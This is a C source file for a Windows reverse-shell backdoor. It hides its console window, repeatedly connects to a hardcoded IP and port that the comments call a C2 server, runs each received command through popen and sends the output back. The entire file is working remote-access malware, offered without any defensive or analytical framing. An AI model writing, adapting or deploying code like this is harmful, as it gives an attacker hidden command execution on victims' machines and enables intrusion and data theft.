#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <process.h>
#define bzero(p, size) (void) memset((p),0,(size))
//set host ip address and port number
char *ServIP = "172.21.1.153";
unsigned short ServPort = 7593;
int sock;

void Shell(){
  char buffer[1024]; //contains all the commands from the server(c2c)
  char container[1024]; //check if command >  1024
  char total_response[18834]; //concatenat if the command > 1024
  
  while (1) {
    jump:
    bzero(buffer,sizeof(buffer));
    bzero(container, sizeof(container));  
    bzero(total_response, sizeof(total_response));
    recv(sock, buffer, sizeof(buffer),0);

    //quit server with q command
    if (strncmp("q", buffer, 1) == 0) {
      closesocket(sock);
      WSACleanup();
      exit(0);
    }
    //run any other commands
    else{
      //fp =file of the buffer
      FILE *fp;
      fp = popen(buffer, "r"); //read and execute
       
      //concatenattion process when commands > 1024
      while (fgets(container, sizeof(container), fp) != NULL) {
        strcat(total_response, container);
      }
      send(sock, total_response,sizeof(total_response), 0);
      fclose(fp);
    }
    
  }
}
//our main function
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd){
  //creating a handle and hiding the console window
  HWND stealth;
  AllocConsole();
  stealth = FindWindowA("ConsoleWindowClass", NULL);

  ShowWindow(stealth,0);

  //creat socket object
  struct sockaddr_in ServAddr;
  WSADATA wsaData;
  if (WSAStartup(MAKEWORD(2,0), &wsaData) !=0) {
    exit(1);
  }
  //Defining the socket object
  sock = socket(AF_INET, SOCK_STREAM, 0);
  memset(&ServAddr,0,sizeof(ServAddr));

  //set the ServAddr parameters
  ServAddr.sin_family =AF_INET;
  ServAddr.sin_addr.s_addr =inet_addr(ServIP);
  ServAddr.sin_port = htons(ServPort);

  //making a connection to the server using the connect function
start:
  while (connect(sock,(struct sockaddr*)&ServAddr,sizeof(ServAddr)) !=0) {
    sleep(5);
    goto start;
  }
  
  Shell();
}
